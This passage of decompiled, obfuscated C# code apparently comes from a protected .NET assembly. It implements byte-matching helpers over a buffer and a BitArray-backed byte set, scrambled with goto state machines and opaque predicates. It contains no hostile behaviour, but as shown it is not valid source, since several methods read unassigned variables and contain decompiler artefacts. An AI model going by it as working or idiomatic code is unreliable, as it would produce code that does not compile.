      ++this.wlr;
      flag = true;
      int num = 1;
      if (!dZ.lNh())
        goto label_2;
label_1:
      switch (num)
      {
        default:
          goto label_4;
      }
label_2:
      num = 1;
      goto label_1;
    }

    public bool oag(byte _param1, byte _param2, byte _param3)
    {
      if (this.wlr < this.Wl2)
        goto label_3;
label_2:
      bool flag = false;
      goto label_5;
label_3:
      byte num1 = this.FaF[this.wlr];
      int num2 = 0;
      if (!dZ.lNh())
        goto label_4;
label_1:
      switch (num2)
      {
        case 1:
          goto label_5;
        default:
          if ((int) num1 == (int) _param1 || (int) num1 == (int) _param2 || (int) num1 == (int) _param3)
          {
            ++this.wlr;
            flag = true;
            goto label_5;
          }
          else
            goto label_2;
      }
label_4:
      int num3;
      num2 = num3;
      goto label_1;
label_5:
      return flag;
    }

    public bool Kaw(byte _param1, byte _param2, byte _param3, byte _param4)
    {
      int num1 = 1;
      bool flag;
      while (true)
      {
        switch (num1)
        {
          case 1:
            flag = this.wlr < this.Wl2;
            num1 = dZ.lNh() ? 0 : 0;
            continue;
          case 2:
            byte num2 = this.FaF[this.wlr];
            if ((int) num2 == (int) _param1 || (int) num2 == (int) _param2 || (int) num2 == (int) _param3 || (int) num2 == (int) _param4)
            {
              ++this.wlr;
              num1 = 3;
              continue;
            }
            goto label_8;
          case 3:
            goto label_7;
          default:
            if (flag)
            {
              num1 = dZ.lNh() ? 2 : 1;
              continue;
            }
            goto label_8;
        }
      }
label_7:
      return true;
label_8:
      return false;
    }

    public bool Bai(byte _param1, byte _param2, byte _param3, byte _param4, byte _param5)
    {
      if (this.wlr >= this.Wl2)
        goto label_5;
      else
        goto label_10;
label_4:
      bool flag;
      return flag;
label_5:
      flag = false;
      goto label_4;
label_10:
      byte num1 = this.FaF[this.wlr];
      int num2 = 1;
      if (dZ.lNh())
        goto label_2;
label_1:
      int num3;
      num2 = num3;
label_2:
      while (true)
      {
        int num4;
        switch (num2)
        {
          case 1:
            if ((int) num1 != (int) _param1 && (int) num1 != (int) _param2 && (int) num1 != (int) _param3 && (int) num1 != (int) _param4)
            {
              num2 = dZ.TNw() != null ? 2 : 2;
              continue;
            }
            num4 = 1;
            break;
          case 2:
            num4 = (int) num1 == (int) _param5 ? 1 : 0;
            break;
          default:
            goto label_4;
        }
        if (num4 != 0)
        {
          ++this.wlr;
          flag = true;
          if (dZ.TNw() == null)
            num2 = 0;
          else
            goto label_1;
        }
        else
          goto label_5;
      }
    }

    public bool yax(
      byte _param1,
      byte _param2,
      byte _param3,
      byte _param4,
      byte _param5,
      byte _param6)
    {
      int num1 = 3;
label_1:
      while (true)
      {
        int num2 = num1;
        bool flag1;
        bool flag2;
        while (true)
        {
          switch (num2)
          {
            case 1:
              if (flag2)
              {
                num2 = !dZ.lNh() ? 0 : 0;
                continue;
              }
              goto label_6;
            case 2:
              if (flag1)
              {
                byte num3 = this.FaF[this.wlr];
                flag2 = (int) num3 == (int) _param1 || (int) num3 == (int) _param2 || (int) num3 == (int) _param3 || (int) num3 == (int) _param4 || (int) num3 == (int) _param5 || (int) num3 == (int) _param6;
                if (dZ.TNw() == null)
                {
                  num2 = 1;
                  continue;
                }
                goto label_1;
              }
              else
                goto label_6;
            case 3:
              goto label_7;
            default:
              goto label_3;
          }
        }
label_7:
        flag1 = this.wlr < this.Wl2;
        num1 = 2;
      }
label_3:
      ++this.wlr;
      return true;
label_6:
      return false;
    }

    public bool zaW(
      byte _param1,
      byte _param2,
      byte _param3,
      byte _param4,
      byte _param5,
      byte _param6,
      byte _param7)
    {
      if (this.wlr < this.Wl2)
        goto label_6;
label_4:
      bool flag = false;
      goto label_8;
label_6:
      int num1 = 0;
      if (dZ.TNw() != null)
        goto label_7;
label_1:
      while (true)
      {
        byte num2;
        int num3;
        switch (num1)
        {
          case 1:
            num3 = (int) num2 == (int) _param7 ? 1 : 0;
            break;
          case 2:
            goto label_8;
          default:
            num2 = this.FaF[this.wlr];
            if ((int) num2 != (int) _param1 && (int) num2 != (int) _param2 && (int) num2 != (int) _param3 && (int) num2 != (int) _param4 && (int) num2 != (int) _param5 && (int) num2 != (int) _param6)
            {
              num1 = dZ.TNw() == null ? 1 : 1;
              continue;
            }
            num3 = 1;
            break;
        }
        if (num3 != 0)
        {
          ++this.wlr;
          flag = true;
          num1 = 2;
        }
        else
          goto label_4;
      }
label_7:
      num1 = 0;
      goto label_1;
label_8:
      return flag;
    }

    public bool yaT(
      byte _param1,
      byte _param2,
      byte _param3,
      byte _param4,
      byte _param5,
      byte _param6,
      byte _param7,
      byte _param8)
    {
      int num1 = 2;
label_1:
      bool flag1;
      while (true)
      {
        int num2 = num1;
        byte num3;
        bool flag2;
        while (true)
        {
          switch (num2)
          {
            case 1:
              if (flag2)
              {
                num3 = this.FaF[this.wlr];
                if (dZ.lNh())
                {
                  num2 = 0;
                  continue;
                }
                goto label_1;
              }
              else
                goto label_12;
            case 2:
              flag2 = this.wlr < this.Wl2;
              num2 = dZ.lNh() ? 1 : 0;
              continue;
            case 3:
              goto label_3;
            case 4:
              goto label_10;
            default:
              if ((int) num3 != (int) _param1 && (int) num3 != (int) _param2 && (int) num3 != (int) _param3 && (int) num3 != (int) _param4)
              {
                num2 = 3;
                continue;
              }
              goto label_14;
          }
        }
label_3:
        int num4;
        if ((int) num3 != (int) _param5 && (int) num3 != (int) _param6 && (int) num3 != (int) _param7)
        {
          num4 = (int) num3 == (int) _param8 ? 1 : 0;
          goto label_15;
        }
        else
          goto label_14;
label_12:
        flag1 = false;
        num1 = 4;
        continue;
label_14:
        num4 = 1;
label_15:
        if (num4 == 0)
          goto label_12;
        else
          goto label_11;
      }
label_10:
      return flag1;
label_11:
      ++this.wlr;
      flag1 = true;
      goto label_10;
    }

    public bool AaQ(byte[] _param1)
    {
      if (this.wlr < this.Wl2)
      {
        byte num1 = this.FaF[this.wlr];
        for (int index = 0; index < _param1.Length; ++index)
        {
          if ((int) num1 != (int) _param1[index])
          {
            int num2 = 0;
            if (dZ.TNw() == null)
              goto label_5;
label_1:
            switch (num2)
            {
              case 1:
                goto label_6;
              default:
                continue;
            }
label_5:
            num2 = 0;
            goto label_1;
          }
label_6:
          ++this.wlr;
          return true;
        }
      }
      return false;
    }

    public bool NaN(byte[] _param1)
    {
      byte num1;
      int index;
      if (this.wlr < this.Wl2)
      {
        num1 = this.FaF[this.wlr];
        index = 0;
        goto label_6;
      }
      else
        goto label_4;
label_3:
      bool flag;
      if ((int) num1 == (int) _param1[index])
      {
        flag = false;
        goto label_8;
      }
      else
        goto label_7;
label_4:
      flag = false;
      int num2 = 0;
      if (!dZ.lNh())
        goto label_5;
label_1:
      switch (num2)
      {
        case 1:
          goto label_7;
        case 2:
          goto label_3;
        default:
          goto label_8;
      }
label_5:
      int num3;
      num2 = num3;
      goto label_1;
label_6:
      if (index >= _param1.Length)
      {
        flag = true;
        goto label_8;
      }
      else
        goto label_3;
label_7:
      ++index;
      goto label_6;
label_8:
      return flag;
    }

    public bool waf(dZ.wwP _param1)
    {
      int num1 = 2;
label_1:
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_8;
          case 2:
            if (this.wlr < this.Wl2)
            {
              if (dZ.TNw() == null)
              {
                num2 = 1;
                continue;
              }
              goto label_1;
            }
            else
              goto label_9;
          default:
            goto label_4;
        }
      }
label_4:
      return false;
label_8:
      int num3 = _param1.SL8(this.FaF[this.wlr]) ? 1 : 0;
      goto label_10;
label_9:
      num3 = 0;
label_10:
      if (num3 != 0)
      {
        ++this.wlr;
        return true;
      }
      goto label_4;
    }

    internal static bool lNh() => dZ.WNQ == null;

    internal static dZ TNw() => dZ.WNQ;

    internal static void eNV([In] object obj0) => ((TextWriter) obj0).Flush();

    internal static byte WNq(byte _param0) => dZ.ha5(_param0);

    public sealed class wwP
    {
      private BitArray cLz;
      private bool EIn;
      private static dZ.wwP FkK;

      public wwP(BitArray _param1)
      {
        ccw.xFvA3V();
        // ISSUE: explicit constructor call
        this.\u002Ector(_param1, false);
      }

      public wwP(BitArray _param1, bool _param2)
      {
        ccw.xFvA3V();
        // ISSUE: explicit constructor call
        base.\u002Ector();
        this.cLz = new BitArray(_param1);
        this.EIn = _param2;
      }

      public wwP(dZ.wwP.twr[] _param1, byte[] _param2)
      {
        ccw.xFvA3V();
        // ISSUE: explicit constructor call
        this.\u002Ector(_param1, _param2, false);
      }

      public wwP(dZ.wwP.twr[] _param1, byte[] _param2, bool _param3)
      {
        ccw.xFvA3V();
        // ISSUE: explicit constructor call
        base.\u002Ector();
        int num1 = 0;
        if (_param1 == null)
          goto label_5;
        else
          goto label_7;
label_3:
        int index1;
        dZ.wwP.twr[] twrArray1;
        if (index1 < twrArray1.Length)
          goto label_25;
label_5:
        if (_param2 != null)
          goto label_28;
        else
          goto label_19;
label_1:
        byte[] numArray1;
        int index2;
        byte[] numArray2;
        int num2;
        while (true)
        {
          int index3;
          switch (num2)
          {
            case 1:
              ++index3;
              break;
            case 2:
            case 9:
              if (index2 < numArray2.Length)
                goto case 8;
              else
                goto label_19;
            case 3:
              goto label_8;
            case 4:
              goto label_14;
            case 5:
              ++index2;
              num2 = 9;
              continue;
            case 6:
              goto label_25;
            case 7:
              goto label_17;
            case 8:
              int num3 = (int) numArray2[index2];
              if (num3 > num1)
              {
                num1 = num3;
                num2 = 5;
                continue;
              }
              goto case 5;
            case 10:
              index3 = 0;
              break;
            default:
              goto label_27;
          }
          if (index3 < numArray1.Length)
          {
            this.cLz[(int) numArray1[index3]] = true;
            num2 = true ? 1 : 1;
          }
          else
            num2 = true ? 4 : 1;
        }
label_8:
        dZ.wwP.twr[] twrArray2;
        int index4;
        dZ.wwP.twr twr1 = twrArray2[index4];
        int qio = (int) twr1.QIo;
        goto label_24;
label_14:
        this.EIn = _param3;
        return;
label_17:
label_18:
        if (_param2 != null)
        {
          numArray1 = _param2;
          num2 = 10;
          goto label_1;
        }
        else
          goto label_14;
label_19:
        this.cLz = new BitArray(num1 + 1, false);
        if (_param1 != null)
        {
          twrArray2 = _param1;
          index4 = 0;
          goto label_26;
        }
        else
          goto label_18;
label_24:
        if (qio > (int) twr1.cIV)
          ++index4;
        else
          goto label_27;
label_26:
        if (index4 >= twrArray2.Length)
          goto label_17;
        else
          goto label_8;
label_27:
        this.cLz[qio] = true;
        ++qio;
        goto label_24;
label_28:
        numArray2 = _param2;
        index2 = 0;
        num2 = 2;
        goto label_1;
label_7:
        twrArray1 = _param1;
        index1 = 0;
        goto label_3;
label_25:
        dZ.wwP.twr twr2 = twrArray1[index1];
        if ((int) twr2.cIV > num1)
          goto label_16;
label_4:
        ++index1;
        goto label_3;
label_16:
        num1 = (int) twr2.cIV;
        goto label_4;
      }

      public bool SL8(byte _param1)
      {
        int num1 = 2;
label_1:
        int num2 = num1;
        bool ein;
        bool flag;
        while (true)
        {
          int num3;
          switch (num2)
          {
            case 1:
              num3 = this.cLz[(int) _param1] ? 1 : 0;
              break;
            case 2:
              if ((int) _param1 < this.cLz.Length)
              {
                if (dZ.wwP.ukN())
                {
                  num2 = 1;
                  continue;
                }
                goto label_1;
              }
              else
              {
                num3 = 0;
                break;
              }
            default:
              goto label_3;
          }
          flag = num3 != 0;
          ein = this.EIn;
          num2 = dZ.wwP.pkZ() == null ? 0 : 0;
        }
label_3:
        return ein ? !flag : flag;
      }

      internal static bool ukN() => dZ.wwP.FkK == null;

      internal static dZ.wwP pkZ() => dZ.wwP.FkK;

      public struct twr
      {
        public byte QIo;
        public byte cIV;
        private static object lk4;

        public twr(byte _param1, byte _param2)
        {
          ccw.xFvA3V();
          this.QIo = _param1;
          this.cIV = _param2;
        }

        internal static bool pkM() => dZ.wwP.twr.lk4 == null;

        internal static object MkQ() => dZ.wwP.twr.lk4;
      }
    }
  }
}
